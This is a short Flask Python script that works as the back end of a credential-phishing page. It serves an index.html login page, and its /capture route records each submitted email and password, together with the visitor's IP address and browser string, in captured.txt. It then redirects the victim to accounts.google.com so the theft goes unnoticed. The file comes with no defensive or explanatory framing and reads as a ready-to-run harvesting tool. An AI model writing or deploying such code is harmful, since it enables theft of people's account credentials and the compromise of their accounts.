from flask import Flask, request, redirect, send_from_directory
import datetime, os

app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email', 'N/A')
    password = request.form.get('password', 'N/A')
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    
    log_entry = f"[{ts}] IP: {ip} | UA: {ua}\nEmail: {email}\nPass: {password}\n---\n"
    
    with open('captured.txt', 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    print(f"[CAPTURED] {email}")
    return redirect("https://accounts.google.com", code=302)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)